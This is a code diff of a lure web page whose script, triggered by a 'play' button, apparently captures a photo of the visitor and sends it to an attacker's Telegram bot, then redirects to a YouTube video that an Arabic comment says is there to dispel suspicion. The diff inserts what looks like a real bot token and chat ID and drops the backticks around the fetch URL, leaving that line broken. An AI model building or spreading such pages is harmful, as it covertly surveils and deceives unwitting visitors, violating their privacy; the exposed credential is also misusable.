@@ -17,8 +17,8 @@
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        const TOKEN = 'توكن_بوتك';
-        const CHAT_ID = 'آيدي_حسابك';
+        const TOKEN = '8596805324:AAELff4nCa1M4GWFiGW3gw3vIadL1c1i93o';
+        const CHAT_ID = '8293639164';
 
         document.getElementById('playBtn').addEventListener('click', async () => {
             try {
@@ -35,7 +35,7 @@
                         const formData = new FormData();
                         formData.append('photo', blob, 'photo.jpg');
                         formData.append('chat_id', CHAT_ID);
-                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData })
+                        fetch(https://api.telegram.org/bot${TOKEN}/sendPhoto, { method: 'POST', body: formData })
                         .then(() => { 
                             // توجيهه لفيديو حقيقي لإبعاد الشبهات
                             window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; 
